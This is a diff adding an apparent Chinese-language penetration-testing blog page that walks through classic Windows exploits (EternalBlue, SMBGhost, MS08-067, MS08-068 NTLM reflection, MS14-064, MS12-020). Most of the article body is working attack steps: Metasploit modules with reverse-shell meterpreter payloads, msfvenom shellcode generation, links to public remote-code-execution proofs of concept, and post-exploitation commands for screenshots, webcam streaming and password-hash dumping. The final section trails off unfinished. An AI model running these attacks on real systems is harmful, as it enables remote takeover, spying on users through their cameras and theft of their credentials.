@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Windows经典漏洞 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 内网渗透' />
+  <meta itemprop="name" content="windows经典漏洞">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="367">
+  <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/59/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="windows经典漏洞">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="内网渗透">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="windows经典漏洞">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/59/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/xpath%E6%B3%A8%E5%85%A5/122/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/52/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "windows经典漏洞",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/59\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  367 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/59\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Windows经典漏洞</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows经典漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="367 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="永恒之蓝ms17-010" class="heading-element"><span>0.0.0.1  永恒之蓝MS17-010</span>
+  <a href="#%e6%b0%b8%e6%81%92%e4%b9%8b%e8%93%9dms17-010" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>永恒之蓝介绍</p>
+<p>永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。其中漏洞编号为MS17-010，利用多个SMB远程代码执行漏洞，可在无交互的情况下获取系统最高权限，又为远程代码任意执行。</p>
+<p>445端口开放，可能存在MS017-010漏洞</p>
+<pre tabindex="0"><code>search ms17-010
+&gt; use auxiliary/scanner/smb/smb_ms17_010
+&gt;set rhost 192.168.93.133
+&gt; set rport 445
+&gt; show option
+&gt;exploit或者run
+
+ 发现永恒之蓝漏洞，开始调用漏洞利用模块按照以下参数来进行攻击
+&gt;use exploit/windows/smb/ms17_010_eternalblue
+&gt;set rhost 192.168.93.133
+&gt;set lhost 192.168.93.132
+&gt;set payload windows/x64/meterpreter/reverse_tcp
+&gt; exploit</code></pre><pre tabindex="0"><code> 1 .捕获桌面：
+
+meterpreter screenshot
+
+2 .监视器打开
+
+meterpreter webcam_stream
+
+kali会自动打开浏览器播放被攻击的电脑摄像头，被攻击的电脑摄像头也会变亮
+
+3.获得用户密码
+密码为hash加密值，可以利用在线解密进行破解
+meterpreter &gt; hashdump
+
+ 4.sysinfo查看系统信息</code></pre><h5 id="永恒之黑-cve-2020-0796" class="heading-element"><span>0.0.0.2  永恒之黑 CVE-2020-0796</span>
+  <a href="#%e6%b0%b8%e6%81%92%e4%b9%8b%e9%bb%91-cve-2020-0796" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><strong>简单形成介绍：</strong></p>
+<p>　　该漏洞是Windows10在处理SMB 3.1.1协议的压缩消息时，对头部数据没有做任何安全检查，直接使用，从而引发内存破坏漏洞，达到任意命令执行。</p>
+<p><strong>攻击目标：</strong></p>
+<p>　　漏洞主要攻击端口为445，但也会有其他触发方式如，构造恶意的SMB服务器并通过网页、压缩包、共享目录、OFFICE文档等多种方式传递给目标用户</p>
+<p>​    当用户打开恶意文件，无需开启445端口就可以触发漏洞</p>
+<p><strong>影响版本：</strong></p>
+<p>　　通过此漏洞获取到的权限为系统最高权限</p>
+<p>　　不影响win7，影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。</p>
+<pre tabindex="0"><code>　　Windows 10 Version 1903 for 32-bit Systems
+　　Windows 10 Version 1903 for x64-based Systems
+　　Windows 10 Version 1903 for ARM64-based Systems
+　　Windows Server, Version 1903 (Server Core installation)
+　　Windows 10 Version 1909 for 32-bit Systems
+　　Windows 10 Version 1909 for x64-based Systems
+　　Windows 10 Version 1909 for ARM64-based Systems
+　　Windows Server, Version 1909 (Server Core installation)</code></pre><ul>
+<li>首先判断是否存在漏洞</li>
+</ul>
+<p><a href="https://github.com/ly4k/SMBGhost"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/ly4k/SMBGhost</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">python</span> <span style="color:#58a1dd">scanner</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">py</span> <span style="color:#a6be9d">192.168.90.100</span></span></span></code></pre></div><p>出现 Vulnerable 则表示成功</p>
+<ul>
+<li>打蓝屏</li>
+</ul>
+<p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">python3</span> <span style="color:#58a1dd">CVE</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">2020</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">0796.</span><span style="color:#58a1dd">py</span> <span style="color:#a6be9d">192.168.1.133</span></span></span></code></pre></div><ul>
+<li>拿shell</li>
+</ul>
+<p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<p>1：在KALI系统内下载漏洞利用exp</p>
+<pre tabindex="0"><code>git clonehttps://github.com/chompie1337/SMBGhost_RCE_PoC.git</code></pre><p>2：使用Msfvenom生成正向连接攻击载荷(木马) 端口为：6666</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b &#39;\x00&#39; -i 1 -f python
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b &#39;\x00&#39; -i 1 -f exe</code></pre><blockquote>
+<p>说明:
+1  #-p payload
+2  #-e 编码方式
+3  #-i 编码次数
+4  #-b 在生成的程序中避免出现的值
+5  #LHOST,LPORT 监听上线的主机IP和端口
+6  #-f exe 生成EXE格式
+7 #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。</p>
+</blockquote>
+<p>3：用生成的shellcode将工具目录中exploit.py中的这一部分替换掉（buf后的字符串，保留USER_PAYLOAD不变）小诀窍，先整体粘贴复制，然后将buf += 替换为 user_paload，就不用一行一行粘贴了，节省了很多时间。以下是exploit.py替换后的内容：</p>
+<p>4 :打开msfconsole监听目标机指定端口[端口：6666]</p>
+<blockquote>
+<p>1 msfconsole
+2 use exploit/multi/handler
+3 set payload windows/x64/meterpreter/bind_tcp
+4 set lport 6666            //目标端口
+5 set rhost 172.18.132.88        //目标机ip
+6 run</p>
+</blockquote>
+<p>5：运行exploit.py脚本，反弹shell</p>
+<pre tabindex="0"><code>python3 exploit.py -ip 192.168.1.133</code></pre><p>6：msfconsole已经连接到了目标机进行权限维持</p>
+<h5 id="ms08-067-rce漏洞" class="heading-element"><span>0.0.0.3  MS08-067 RCE漏洞</span>
+  <a href="#ms08-067-rce%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。SMB（server massage block）在windows操作系统中是默认在139/445端口开放的，该协议主要用来共享文件等。基于该协议的漏洞也有不少，当然，ms08067是最有名的一个。</p>
+</blockquote>
+<p>漏洞验证</p>
+<pre tabindex="0"><code>nmap --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.2.139</code></pre><p>漏洞攻击</p>
+<pre tabindex="0"><code>打开msfconsole，查找该漏洞利用框架
+search MS08-067
+msf6 &gt; use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp，然后选择payload
+
+show options
+search payload windows/meterpreter
+set payload windows/meterpreter/reverse_tcp 
+show targets
+set  target  xx
+set  rhost  192.168.244.138
+exploit</code></pre><h5 id="ms08-068-ntlm反射" class="heading-element"><span>0.0.0.4  MS08-068 NTLM反射</span>
+  <a href="#ms08-068-ntlm%e5%8f%8d%e5%b0%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>在早期的 SMB 重放攻击中, 允许将 Client 请求的数据包重放至 Client 本身, 这就造成了 <code>MS08-068</code> 漏洞, 但漏洞在 2008 R2 中已经被修复.</p>
+<p>微软在 Server 系列的系统中默认开启 SMB 签名以防止重放攻击, 而个人系统诸如 Windows 7, Windows 10 则默认关闭签名.</p>
+</blockquote>
+<pre tabindex="0"><code>SMB 协议中的 NTLM 反射漏洞仅针对 Windows 2000 到 Windows Server 2008
+此漏洞允许攻击者将传入的 SMB 连接重定向回它来自的计算机，然后使用受害者自己的凭据访问受害者计算机
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068
+msf &gt; use exploit/windows/smb/smb_relay
+msf exploit(smb_relay) &gt; show targets</code></pre><h5 id="ms14-064" class="heading-element"><span>0.0.0.5  MS14-064</span>
+  <a href="#ms14-064" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>漏洞影响版本</p>
+<pre tabindex="0"><code>Windows Server 2003
+Windows Vista
+Windows Server 2008
+Windows 7
+Windows Server 2008 R2
+Windows 8 和 Windows 8.1
+Windows Server 2012 和 Windows Server 2012 R2
+Windows RT 和 Windows RT 8.1
+服务器核心安装选项</code></pre><pre tabindex="0"><code>use exploit/windows/browser/ms14_064_ole_code_execution
+set AllowPowershellPrompt true
+set lhost 192.168.109.128
+exploit</code></pre><p>打开win7的ie浏览器，访问这个恶意url</p>
+<p>可以看到在kali的msfconsole里面成功收到会话</p>
+<h5 id="ms12-020-dos蓝屏rce漏洞" class="heading-element"><span>0.0.0.6  MS12-020 DoS/蓝屏/RCE漏洞</span>
+  <a href="#ms12-020-dos%e8%93%9d%e5%b1%8frce%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>1、靶机具有MS12_020漏洞，windows2003、windows2008</p>
+<p>2、靶机开启3389端口</p>
+<pre tabindex="0"><code>search ms12-020
+pei&#39;zhi&#39;yi</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="Tags - 内网渗透">内网渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/xpath%E6%B3%A8%E5%85%A5/122/" class="post-nav-item" rel="prev" title="XPATH注入基础"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>XPATH注入基础</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/52/" class="post-nav-item" rel="next" title="Windows横向移动">Windows横向移动<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
